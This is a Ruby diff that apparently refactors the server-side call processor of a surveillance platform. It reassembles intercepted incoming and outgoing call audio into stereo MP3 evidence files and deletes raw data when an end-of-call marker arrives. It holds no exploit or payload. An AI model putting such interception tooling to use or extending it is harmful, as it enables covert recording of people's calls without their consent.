@@ -156,7 +156,7 @@ class Call
     @agent = agent
     @target = target
 
-    @evidence = store peer, program, start_time, agent, target
+    @evidence = nil
   end
 
   def id
@@ -183,10 +183,6 @@ class Call
     channel = get_channel evidence
     return true unless channel.nil?
     return false
-  end
-
-  def end_call?(evidence)
-    return true if evidence[:data][:grid_content].bytesize == 4 and evidence[:data][:grid_content] == "\xff\xff\xff\xff"
   end
   
   def get_channel(evidence)
@@ -234,14 +230,16 @@ class Call
   end
 
   def close!
+    # TODO: flush channels if samples queued
     @channels.each_value {|c| c.close!}
     trace :debug, "[CALL #{@id}] closing call for #{@peer}, starting at #{@start_time}"
-    @evidence.update_attributes("status" => :complete)
+    @evidence.update_attributes("status" => :complete) unless @evidence.nil?
     delete_raws
     true
   end
   
   def closed?
+    return false if @channels.size == 0
     closed_channels = @channels.select {|k,v| v.closed? unless v.nil? }
     return closed_channels.size == @channels.size
   end
@@ -251,9 +249,7 @@ class Call
     @raw_ids << evidence[:db_id]
 
     # if evidence is empty or call is closed, refuse feeding
-    return false if evidence[:wav].size == 0
     return false if closed?
-    return close! if end_call? evidence
 
     # get the correct channel for the evidence
     channel = get_channel(evidence)
@@ -269,6 +265,8 @@ class Call
 
     unless queueing?
       if dual_channel?
+        @evidence ||= store @peer, @program, @start_time, @agent, @target
+
         num_samples = [@channels[:outgoing].wav_data.size, @channels[:incoming].wav_data.size].min
 
         left_pcm = @channels[:outgoing].wav_data.shift num_samples
@@ -278,6 +276,8 @@ class Call
 
         yield @sample_rate, left_pcm, right_pcm
       elsif single_channel?
+        @evidence ||= store @peer, @program, @start_time, @agent, @target
+
         channel = @channels.values[0]
 
         left_pcm = channel.wav_data.shift(channel.wav_data.size)
@@ -356,14 +356,13 @@ class CallProcessor
     @target = target
     @call = nil
   end
-  
+
   def get_call(evidence)
-    # if peer is unknown or evidence is empty, evidence is invalid, ignore it
-    return nil if evidence[:data][:peer].empty? or evidence[:wav].empty?
+    # if peer is unknown, evidence is invalid, ignore it
+    return nil if evidence[:data][:peer].empty?
 
     # first call, create it
     if @call.nil?
-      close_call {|evidence, raw_ids| yield evidence, raw_ids}
       @call = create_call(evidence)
       return @call
     end
@@ -386,15 +385,31 @@ class CallProcessor
   def create_call(evidence)
     Call.new(evidence[:data][:peer], evidence[:data][:program], evidence[:data][:start_time], @agent, @target)
   end
+
+  def end_call?(evidence)
+    if evidence[:data][:grid_content].bytesize == 4 and evidence[:data][:grid_content] == "\xff\xff\xff\xff"
+      trace :debug, "[CALL #{@id}] LA CHIAMATA E' DA CHIUDERE!!!'"
+      return true
+    end
+    false
+  end
   
   def feed(evidence)
+    if end_call? evidence
+      @call.close! unless @call.nil?
+      @call = nil
+      RCS::DB::GridFS.delete(evidence[:db_id], "evidence")
+      trace :debug, "deleted raw evidence #{evidence[:db_id]}"
+      return nil
+    end
+
     call = get_call(evidence) {|evidence, raw_ids| yield evidence, raw_ids}
-    unless call.nil?
-      call.feed evidence do |sample_rate, left_pcm, right_pcm|
-        encode_mp3(sample_rate, left_pcm, right_pcm) do |mp3_bytes|
-          File.open("#{call.file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }
-          write_to_grid(call, mp3_bytes)
-        end
+    return nil if call.nil?
+
+    call.feed evidence do |sample_rate, left_pcm, right_pcm|
+      encode_mp3(sample_rate, left_pcm, right_pcm) do |mp3_bytes|
+        File.open("#{call.file_name}.mp3", 'ab') {|f| f.write(mp3_bytes) }
+        write_to_grid(call, mp3_bytes)
       end
     end
     nil
